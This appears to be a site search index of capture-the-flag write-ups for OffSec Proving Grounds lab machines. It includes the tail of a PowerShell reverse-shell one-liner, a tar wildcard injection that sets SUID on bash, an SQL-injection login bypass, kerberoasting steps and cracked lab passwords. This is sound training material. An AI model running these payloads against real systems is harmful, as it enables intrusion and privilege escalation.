= $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"access/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>sharphound</code> and get the zip. See the data in <code>bloodhound</code>.</p> <p>User <code>svc_mssql</code> is kerberoastable.</p> <p>We don't have <code>svc_apache</code> password, so we have to execute the attack on the target. Transfer <code>rubeus</code> there.</p> <p></p> <p>Using <code>hashcat</code>:</p> <p></p> <p>We have <code>svc_mssql:trustno1</code></p> <p>To execute commands as this user, we need <code>runas</code>.</p> <p>Using <code>-Remote</code>, we can redirect the shell to a remote one.</p> <p></p> <p>This user has <code>SeManageVolumePrivilege</code>.</p> <p></p> <p>Using https://github.com/CsEnox/SeManageVolumeExploit</p> <p>Download and transfer the exe.</p> <p></p> <p>Now, following the readme, generate a malicious DLL with <code>msfvenom</code> and transfer it to <code>C:\\windows\\system32\\spool\\drivers\\x64\\3\\PrintConfig.dll</code></p> <p>Start a listener and trigger it.</p> <p> </p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"access/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hokkaido/","title":"Hokkaido \ud83d\udd38","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hokkaido/#enumeration","title":"Enumeration","text":"<p>Using <code>kerbrute</code>, discover users.</p> <p></p> <p>Checking <code>info/info</code>.</p> <p></p> <p>We find a password inside <code>sysvol</code>.</p> <p> </p> <p>Spraying it, we find:</p> <p></p> <p><code>discovery:Start123!</code></p> <p>Connect to the <code>db</code>.</p> <p></p> <p>Show impersonations and activate it to see the database.</p> <p> </p> <p>So we have <code>hrapp-service:Untimed$Runny</code></p> <p>Using <code>bloodhound-python</code>, we can now see the AD.</p> <p></p> <p>This user has <code>GenericWrite</code> over <code>hazel.green</code>, so we can execute a targeted kerberoast from <code>hrapp-service</code>.</p> <p></p> <p>Using <code>hashcat</code>:</p> <p></p> <p>So <code>hazel.green:haze1988</code></p> <p>We can see that <code>hazel</code> belongs to <code>tier2-admins</code> and this group can <code>forcechangepassword</code> of <code>molly smith</code> who can <code>rdp</code> to the DC machine.</p> <p> </p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hokkaido/#initial-access","title":"Initial Access","text":"<p>RDP to the machine with <code>molly</code>.</p> <p> </p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hokkaido/#privilege-escalation","title":"Privilege Escalation","text":"<p>Open <code>powershell</code> as administrator.</p> <p></p> <p>We are <code>backup operator</code>, so get <code>sam</code> and <code>system</code> (as we are in a DC, <code>sam</code> could contain domain admin hash mirrored from <code>ntds.dit</code>).</p> <p> </p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hokkaido/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hutch/","title":"Hutch \ud83d\udd38","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hutch/#enumeration","title":"Enumeration","text":"<p>Enumerating <code>LDAP</code> anonymously.</p> <p></p> <p>There is a user with a password in comment.</p> <p></p> <p><code>fmcsorley:CrabSharkJellyfish192</code></p> <p>Use <code>bloodhound-python</code> to scout the domain.</p> <p> </p> <p>This user can read the local admin password using <code>pylaps</code>.</p> <p></p> <p>So <code>Administrator:rD{7eI/@x9tG/[</code></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hutch/#initial-access","title":"Initial Access","text":"<p>Using <code>evil-winrm</code>.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"hutch/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags.</p> <p> </p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"nagoya/","title":"Nagoya \ud83d\udd3a","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"nagoya/#enumeration","title":"Enumeration","text":"<p>Web server has a landing page.</p> <p></p> <p>The Team tab shows all the users.</p> <p></p> <p>We can make a list and use <code>kerbrute</code> to check if there are valid users.</p> <p></p> <p>Now make a wordlist, using <code>2023</code> as the web and the image metadata is from 2023 and use seasons like <code>Summer</code>.</p> <p> </p> <p>We have <code>Fiona.Clark:Summer2023</code> and <code>Craig.Carr:Spring2023</code>.</p> <p></p> <p><code>SVC_HELPDESK</code> is kerberoastable. Having that account, we can compromise <code>christopher.lewis</code>, then connect to the machine and then <code>dcsync</code> the domain.</p> <p>We can't crack <code>svc_helpdesk</code> password, but either <code>fiona</code> or <code>craig</code> have <code>GenericAll</code> over the account, so...</p> <p> </p> <p>Now to <code>christopher.lewis</code> who can <code>psremote</code>.</p> <p> </p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"nagoya/#initial-access","title":"Initial Access","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"nagoya/#privilege-escalation","title":"Privilege Escalation","text":"<p><code>MSSQL</code> service is running locally, so we transfer <code>chisel</code> and make a port forward.</p> <p> </p> <p>Now we forge a Kerberos silver ticket and connect to that port.</p> <p> </p> <p>Transfer <code>printspoofer</code> and escalate privileges.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"nagoya/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"resourced/","title":"Resourced \ud83d\udd38","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"resourced/#enumeration","title":"Enumeration","text":"<p>Using <code>rpclient</code>, we can enumerate the users and descriptions.</p> <p></p> <p>So we have <code>v.ventz:HotelCalifornia194!</code></p> <p></p> <p>Checking <code>smb</code> shares, we have some stuff.</p> <p> </p> <p>We can get <code>system</code> and <code>ntds.dit</code> to get LSA credentials.</p> <p></p> <p>Put them in a text file and use <code>hashcat</code>.</p> <p>Nothing, let's pass the hash to move laterally.</p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"resourced/#initial-access","title":"Initial Access","text":"<p>Using <code>evil-winrm</code>.</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"resourced/#privilege-escalation","title":"Privilege Escalation","text":"<p>Use <code>bloodhound-python</code> to get the zip.</p> <p> </p> <p>This user has <code>GenericAll</code> to the machine, so we can perform an <code>RBCD</code> attack.</p> <p>https://github.com/tothi/rbcd-attack</p> <p> </p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"resourced/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"vault/","title":"Vault \ud83d\udd3a","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"vault/#enumeration","title":"Enumeration","text":"<p>Using <code>--rid</code> force, we have the users and groups.</p> <p></p> <p>There is a writable folder <code>DocumentsShare</code>, so we can put a <code>.lnk</code> file pointing to our <code>smb2</code> server to get hashes using <code>ntml_theft</code>.</p> <p> </p> <p>Using <code>hashcat</code>:</p> <p></p> <p><code>anirudh:SecureHM</code></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"vault/#initial-access","title":"Initial Access","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"vault/#privilege-escalation","title":"Privilege Escalation","text":"<p>Using <code>bloodhound-python</code>, we notice that the user has <code>writedacl</code> permissions.</p> <p></p> <p>We can use <code>SharpGPOAbuse.exe</code> to add ourselves to the admin group.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\"\n[+] Domain = vault.offsec\n[+] Domain Controller = DC.vault.offsec\n[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec\n[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103\n[+] GUID of \"Default Domain Policy\" is: {31B2F340-016D-11D2-945F-00C04FB984F9}\n[+] File exists: \\\\vault.offsec\\SysVol\\vault.offsec\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\n[+] The GPO does not specify any group memberships.\n[+] versionNumber attribute changed successfully\n[+] The version number in GPT.ini was increased successfully.\n[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!\n*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; \n</code></pre> <p>Re-enter with <code>psexec</code> and:</p> <pre><code>$ python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 192.168.120.116.....\n[*] Found writable share ADMIN$\n[*] Uploading file WGPlQkwE.exe\n[*] Opening SVCManager on 192.168.120.116.....\n[*] Creating service LVYv on 192.168.120.116.....\n[*] Starting service LVYv.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.2300]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n\nC:\\Windows\\system32&gt; \n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"vault/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\u2694\ufe0f Proving Grounds","Proving Grounds","Active Directory"]},{"location":"amaterasu/","title":"Amaterasu \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"amaterasu/#enumeration","title":"Enumeration","text":"<p>Using <code>feroxbuster</code> on port <code>33414</code>, we find <code>/info</code> and <code>/help</code>:</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"amaterasu/#initial-access","title":"Initial Access","text":"<p>The user <code>alfredo</code> has a <code>.ssh</code> folder and there is an SSH port open, so we can try to upload an <code>authorized_keys</code> file with a public key inside.</p> <p></p> <pre><code>cat id_rsa.pub &gt; authorized_keys.txt\n</code></pre> <p></p> <p></p> <p>Get the flag:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"amaterasu/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>pspy</code> to the machine and we see a task executing.</p> <p></p> <p></p> <p>We don't have permission to edit the script, but we see that <code>tar</code> is using a wildcard, so we can exploit that.</p> <pre><code>echo -n 'chmod +s /bin/bash' | base64\n&gt; Y2htb2QgK3MgL2Jpbi9iYXNo\ntouch -- \"--checkpoint=1\"\ntouch -- '--checkpoint-action=exec=\"echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash\"'\n</code></pre> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"amaterasu/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"apex/","title":"Apex \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"apex/#enumeration","title":"Enumeration","text":"<p>The web server shows a page of medical stuff.</p> <p></p> <p>Let's add <code>apex.offsec</code> to <code>/etc/hosts</code>.</p> <p>We have four potential users:</p> <p></p> <p>And a scheduler app:</p> <p></p> <p>We find documents in the <code>smb</code> share that can be accessed without a username or password.</p> <p></p> <p>With <code>feroxbuster</code>, we find a <code>filemanager</code> path, serving the same files as the <code>smb</code> share in a <code>documents</code> folder.</p> <p></p> <p></p> <p>We can upload PHP files, but the app won't show them.</p> <p>Searching with <code>searchsploit</code>:</p> <p></p> <p>We can search in GitHub where <code>sqlconf</code> is located, but we need to edit the script and put <code>Documents</code> in the path where the file is being copied to. This way, we can see it in the <code>smb</code> share, since here we can't see PHP files.</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"apex/#initial-access","title":"Initial Access","text":"<p>We can access the database with the credentials and get users.</p> <p></p> <p></p> <p></p> <p>Using <code>searchsploit</code> to get an <code>openemr</code> exploit:</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"apex/#privilege-escalation","title":"Privilege Escalation","text":"<p>The password is the same as before.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"apex/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"astronaut/","title":"Astronaut \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"astronaut/#enumeration","title":"Enumeration","text":"<p>The web server has a file index with a <code>grav</code> page inside.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"astronaut/#initial-access","title":"Initial Access","text":"<p>Using this exploit <code>exploit.py</code>, we can get a shell.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"astronaut/#privilege-escalation","title":"Privilege Escalation","text":"<p>We have <code>php</code> with the SUID bit set.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"astronaut/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bratarina/","title":"Bratarina \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bratarina/#enumeration","title":"Enumeration","text":"<p>Starting with <code>smb</code>, we have a <code>backups</code> folder and a file inside.</p> <p></p> <p></p> <p>The web page shows:</p> <p></p> <p>Although <code>opensmtpd</code> is version <code>2.0.0</code>, we can use a <code>6.6.1</code> exploit.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bratarina/#initial-access","title":"Initial Access","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bratarina/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bullybox/","title":"Bullybox \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bullybox/#enumeration","title":"Enumeration","text":"<p>Add <code>bullybox.local</code> to <code>/etc/hosts</code>.</p> <p></p> <p>We find <code>CVE-2022-3552</code>, but we need admin credentials.</p> <p>Using <code>feroxbuster</code>, we can use <code>-x git</code> and get a <code>.git</code> repository.</p> <p>Download with <code>git-dumper</code>:</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bullybox/#initial-access","title":"Initial Access","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bullybox/#privilege-escalation","title":"Privilege Escalation","text":"<p>The user has <code>sudo</code> privileges with <code>ALL</code>, so:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"bullybox/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"clamav/","title":"ClamAV \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"clamav/#enumeration","title":"Enumeration","text":"<p>Web page</p> <p></p> <p>Converting the binary to text, we have:</p> <p></p> <p><code>ifyoudontpwnmeuran00b</code> \u2014 maybe this is a password.</p> <p>Using <code>searchsploit</code>:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"clamav/#initial-access","title":"Initial Access","text":"<p>This opens a port at <code>31337</code>, so:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"clue/","title":"Clue \ud83d\udd3a","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"clue/#enumeration","title":"Enumeration","text":"<p>We can connect to <code>smb</code> shares.</p> <p></p> <p>The web server is forbidden.</p> <p></p> <p>Port <code>300</code> is for <code>Apache Cassandra</code>.</p> <p></p> <p>Searching for an exploit for <code>freeswitch</code>:</p> <p></p> <p>But it doesn't seem to work.</p> <p></p> <p>The exploit is using the default password <code>ClueCon</code>.</p> <p></p> <p>So the default password is not set.</p> <p>Looking in the <code>smb</code> share <code>freeswitch</code>, we find <code>ClueCon</code>.</p> <p></p> <p>So the password is set in <code>/etc/freeswitch/autoload_configs/event_socket.conf.xml</code>.</p> <p>Searching for an exploit for <code>cassandra</code>:</p> <p></p> <p>We can read files, so we can try to get the password from before.</p> <p></p> <p>And the password is different: <code>StrongClueConEight021</code>.</p> <p>Using the exploit from before, we can change the password.</p> <p></p> <p>We can set a reverse shell.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"clue/#privilege-escalation","title":"Privilege Escalation","text":"<p><code>ps auxww</code> shows a <code>ruby</code> process with the <code>cassie</code> password:</p> <p></p> <p><code>cassie:SecondBiteTheApple330</code></p> <p></p> <p>With <code>sudo -l</code>, we see that we can execute <code>cassandra-web</code> as root, so:</p> <p></p> <p>Now, using the same exploit as before for reading files, we would be reading files as root.</p> <p>Start a <code>cassandra-web</code> on another port and execute the script locally.</p> <p></p> <p>The script is only making a <code>curl</code> request with eight <code>../</code>, so we can do it without the script locally.</p> <p></p> <p>If we check Anthony's stuff, in bash history we see:</p> <p></p> <p>So the private key is the same for <code>anthony</code> and <code>root</code>, so read <code>id_rsa</code> and login via SSH.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"clue/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"cockpit/","title":"Cockpit \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"cockpit/#enumeration","title":"Enumeration","text":"<p>Port <code>9090</code> shows the <code>cockpit</code> service page.</p> <p></p> <p>Port <code>80</code> shows a web page.</p> <p></p> <p>Using <code>feroxbuster</code> with <code>-x php</code>, we find <code>login.php</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"cockpit/#initial-access","title":"Initial Access","text":"<p>And the web</p> <p></p> <p>It seems that there is a possible SQLi.</p> <p></p> <p>Putting <code>admin'-- -</code> works.</p> <p></p> <p></p> <p>Enter and go to the terminal.</p> <p></p> <p>Get the flag.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"cockpit/#privilege-escalation","title":"Privilege Escalation","text":"<p>With <code>sudo -l</code>, we see that we have permissions to run <code>tar</code> with a wildcard.</p> <p></p> <p>So we create in <code>/tmp</code> a checkpoint and an action to put the SUID bit on <code>bash</code>.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"cockpit/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"exfiltrated/","title":"Exfiltrated \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"exfiltrated/#enumeration","title":"Enumeration","text":"<p>Add <code>exfiltrated.offsec</code> to <code>/etc/hosts</code>.</p> <p>The webserver shows a <code>Kickstart</code> page.</p> <p></p> <p>We can log in with <code>admin:admin</code>.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"exfiltrated/#initial-access","title":"Initial Access","text":"<p>https://github.com/Swammers8/SubrionCMS-4.2.1-File-upload-RCE-auth-</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"exfiltrated/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get a reverse shell.</p> <p></p> <p></p> <p>There is a script using <code>exiftool</code> that is being executed every minute.</p> <p></p> <p>Following this guide, we can generate a malicious jpg: https://ine.com/blog/exiftool-command-injection-cve-2021-22204-exploitation-and-prevention-strategies</p> <p>Transfer the jpg with the payload to the path of the script and set a listener.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"exfiltrated/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"extplorer/","title":"Extplorer \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"extplorer/#enumeration","title":"Enumeration","text":"<p>The web server has a brand new <code>WordPress</code> without any configuration. Using <code>feroxbuster</code>, we find <code>/filemanager/index.php</code>.</p> <p></p> <p>Testing <code>admin:admin</code>, we get inside.</p> <p></p> <p>We find a user <code>dora</code>.</p> <p></p> <p>And the version.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"extplorer/#initial-access","title":"Initial Access","text":"<p>Upload a PHP reverse shell to <code>/wordpress</code>.</p> <p></p> <p>And we are in as <code>www-data</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"extplorer/#privilege-escalation","title":"Privilege Escalation","text":"<p>Looking at the files, we find:</p> <p></p> <p>And using <code>hashcat</code>:</p> <p></p> <p>So we can pivot to <code>dora</code>.</p> <p></p> <p>Then the flag.</p> <p></p> <p><code>dora</code> belongs to the <code>disk</code> group.</p> <p></p> <p>So we can read root files using <code>debugfs</code>.</p> <p></p> <p>Getting <code>shadow</code> and <code>passwd</code>.</p> <p></p> <p>Using:</p> <p></p> <p>And <code>john</code>:</p> <p></p> <p>We have the password: <code>explorer</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"extplorer/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fanatastic/","title":"Fanatastic \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fanatastic/#enumeration","title":"Enumeration","text":"<p>We have a <code>Prometheus</code> + <code>Grafana</code> stack.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fanatastic/#initial-access","title":"Initial Access","text":"<p>Searching for exploits, we have a path traversal one.</p> <p></p> <p>We can read the <code>grafana</code> database and get data source credentials from <code>/var/lib/grafana/grafana.db</code>.</p> <p></p> <p></p> <p>Searching for an exploit to decrypt it, we have https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798</p> <p>SSH with credentials.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fanatastic/#privilege-escalation","title":"Privilege Escalation","text":"<p>The user belongs to the <code>disk</code> group, so we can read root files.</p> <p>We can read the root private key and SSH to the host.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fanatastic/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fired/","title":"Fired \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fired/#enumeration","title":"Enumeration","text":"<p>At port <code>9090</code>, we have an <code>Openfire</code> login screen. We search and find the exploit.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fired/#initial-access","title":"Initial Access","text":"<p>https://github.com/miko550/CVE-2023-32315</p> <p>Execute the exploit, create a new user, log in as the user, and upload the jar. Then go to the server tab, server settings, and management tool with password <code>123</code>.</p> <p></p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fired/#privilege-escalation","title":"Privilege Escalation","text":"<p>Find all <code>openfire</code> related folders and search for passwords.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"fired/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"flu/","title":"Flu \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"flu/#enumeration","title":"Enumeration","text":"<p>Port <code>8090</code> shows a <code>Confluence</code> page.</p> <p>Searching for exploits, we have this: https://github.com/jbaines-r7/through_the_wire</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"flu/#initial-access","title":"Initial Access","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"flu/#privilege-escalation","title":"Privilege Escalation","text":"<p>Notice the script at <code>/opt</code>.</p> <p></p> <p>Using <code>pspy64</code>, we see that it is being executed periodically.</p> <p></p> <p>The file is ours, so we can add a payload.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"flu/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"hawat/","title":"Hawat 